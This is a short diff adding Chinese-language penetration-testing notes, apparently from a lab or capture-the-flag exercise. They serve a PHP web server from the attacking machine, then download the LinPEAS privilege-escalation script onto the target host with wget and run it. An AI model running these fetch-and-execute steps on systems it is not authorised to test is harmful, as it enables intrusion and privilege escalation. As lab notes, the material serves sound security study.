@@ -1,0 +1,5 @@
+使用php建立一个服务器 
+sudo php -S 0:80
+在靶机bash环境下使用Wget http://192.168.52.131/linpeas.sh 
+chmod +x linpeas.sh
+./linpeas.sh
